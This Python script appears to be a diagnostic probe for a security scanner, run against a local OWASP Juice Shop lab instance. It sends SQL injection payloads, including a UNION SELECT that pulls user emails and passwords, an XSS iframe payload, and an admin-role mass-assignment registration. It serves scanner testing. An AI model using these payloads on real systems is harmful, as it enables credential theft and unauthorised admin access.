"""
AegisAI Phase 4B — Diagnostic Probe Script
Inspects live responses from Juice Shop for the 3 FN vulnerabilities:
1. SQLi on /rest/products/search
2. XSS on search / products / DOM
3. Auth bypass on /api/Users
"""

import httpx
import json

base_url = "http://localhost:3000"

def test_sqli():
    print("=" * 60)
    print("1. SQL INJECTION DIAGNOSTIC: /rest/products/search")
    print("=" * 60)
    with httpx.Client(base_url=base_url) as c:
        # Baseline
        r_base = c.get("/rest/products/search", params={"q": "apple"})
        data_base = r_base.json().get("data", [])
        print(f"Baseline 'apple': status={r_base.status_code}, count={len(data_base)}, len={len(r_base.text)}")

        # Single quote
        r_quote = c.get("/rest/products/search", params={"q": "'"})
        print(f"Single quote: status={r_quote.status_code}, body={r_quote.text[:150]}")

        # Breakout syntax error attempt
        r_err = c.get("/rest/products/search", params={"q": "'))))"})
        print(f"Parenthesis error: status={r_err.status_code}, body={r_err.text[:150]}")

        # Boolean True vs False
        r_btrue = c.get("/rest/products/search", params={"q": "apple')) OR 1=1--"})
        btrue_data = r_btrue.json().get("data", []) if r_btrue.status_code == 200 else []
        print(f"Boolean True (apple')) OR 1=1--): status={r_btrue.status_code}, count={len(btrue_data)}, len={len(r_btrue.text)}")

        r_bfalse = c.get("/rest/products/search", params={"q": "apple')) AND 1=2--"})
        bfalse_data = r_bfalse.json().get("data", []) if r_bfalse.status_code == 200 else []
        print(f"Boolean False (apple')) AND 1=2--): status={r_bfalse.status_code}, count={len(bfalse_data)}, len={len(r_bfalse.text)}")

        # Boolean with non-existent keyword
        r_diff_t = c.get("/rest/products/search", params={"q": "zzzznotexist')) OR 1=1--"})
        diff_t_data = r_diff_t.json().get("data", []) if r_diff_t.status_code == 200 else []
        print(f"Differential True (zzzznotexist')) OR 1=1--): status={r_diff_t.status_code}, count={len(diff_t_data)}")

        r_diff_f = c.get("/rest/products/search", params={"q": "zzzznotexist')) OR 1=2--"})
        diff_f_data = r_diff_f.json().get("data", []) if r_diff_f.status_code == 200 else []
        print(f"Differential False (zzzznotexist')) OR 1=2--): status={r_diff_f.status_code}, count={len(diff_f_data)}")

        # Union injection test
        r_union = c.get("/rest/products/search", params={"q": "')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"})
        print(f"Union query: status={r_union.status_code}, body={r_union.text[:200]}")

        # Check what query structure Juice Shop uses in server code
        # Juice shop: SELECT * FROM Products WHERE ((name LIKE '%q%' OR description LIKE '%q%') AND deletedAt IS NULL) ORDER BY name
        r_union_fix = c.get("/rest/products/search", params={"q": "')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"})
        print(f"Union data: count={len(r_union_fix.json().get('data', [])) if r_union_fix.status_code == 200 else 'N/A'}")


def test_xss():
    print("\n" + "=" * 60)
    print("2. XSS / DOM XSS DIAGNOSTIC")
    print("=" * 60)
    with httpx.Client(base_url=base_url) as c:
        # Backend API reflection check
        payload = '<iframe src="javascript:alert(1)">'
        r_api = c.get("/rest/products/search", params={"q": payload})
        print(f"API /rest/products/search: status={r_api.status_code}, payload in body={payload in r_api.text}")
        print(f"API Content-Type: {r_api.headers.get('content-type')}")
        print(f"API Response sample: {r_api.text[:150]}")

        # SPA frontend route check: /#/search?q=...
        r_fe = c.get(f"/")
        print(f"Frontend root HTML: status={r_fe.status_code}, len={len(r_fe.text)}")
        # Notice in Angular SPA, /#/search is client-side routed! The query param q is handled in DOM.


def test_auth_bypass():
    print("\n" + "=" * 60)
    print("3. AUTH BYPASS / PRIVILEGE ESCALATION DIAGNOSTIC: /api/Users")
    print("=" * 60)
    with httpx.Client(base_url=base_url) as c:
        # Attempt registering with role: admin
        # In Juice Shop, role parameter in /api/Users sets the user role in DB!
        import uuid
        test_email = f"diag_admin_{uuid.uuid4().hex[:6]}@test.com"
        reg_body = {
            "email": test_email,
            "password": "Password123!",
            "role": "admin",
            "securityQuestion": {"id": 1, "name": "Your eldest siblings middle name?"},
            "securityAnswer": "test",
        }
        r_reg = c.post("/api/Users", json=reg_body)
        print(f"POST /api/Users with role='admin': status={r_reg.status_code}")
        print(f"Response: {r_reg.text[:300]}")

        # Now login with this newly created user and inspect returned JWT and role!
        r_login = c.post("/rest/user/login", json={"email": test_email, "password": "Password123!"})
        print(f"Login with created user: status={r_login.status_code}")
        if r_login.status_code == 200:
            auth_info = r_login.json().get("authentication", {})
            user_data = auth_info.get("um", {})
            print(f"Auth token received: {bool(auth_info.get('token'))}")
            print(f"User role from login: {auth_info.get('role') or user_data.get('role')}")
            print(f"Full auth response: {r_login.text[:350]}")

            # Verify admin privilege by accessing an admin-only endpoint!
            token = auth_info.get("token")
            r_admin_check = c.get("/rest/admin/application-version", headers={"Authorization": f"Bearer {token}"})
            print(f"Access /rest/admin/application-version with token: status={r_admin_check.status_code}")
            r_users = c.get("/api/Users", headers={"Authorization": f"Bearer {token}"})
            print(f"Access GET /api/Users with admin token: status={r_users.status_code}")


if __name__ == "__main__":
    test_sqli()
    test_xss()
    test_auth_bypass()
